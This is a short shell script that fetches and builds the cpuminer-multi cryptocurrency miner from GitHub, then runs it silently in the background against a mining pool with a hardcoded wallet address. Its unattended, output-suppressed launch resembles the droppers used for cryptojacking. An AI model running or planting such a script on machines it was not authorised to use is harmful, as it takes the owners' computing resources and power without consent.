#!/bin/sh
cd `dirname $0`

sudo toolbox
apt-get update
apt-get install -y autoconf automake libcurl4-openssl-dev git zsh gcc make
git clone https://github.com/OhGodAPet/cpuminer-multi
cd cpuminer-multi
./autogen.sh
CFLAGS="-march=native" ./configure
make install
/usr/local/bin/minerd -t 1 -B -o stratum+tcp://pool.krbpool.com:33337  -u KgGc79QyYag4LugEc2Gnxobt7Mfe9CSEh4NqGzdysooL3Czy6mKtuqLiCehzgoBDESTaYDN3U9XtgLxVJLmPCi397ppx6cL -p x >& /dev/null
exit
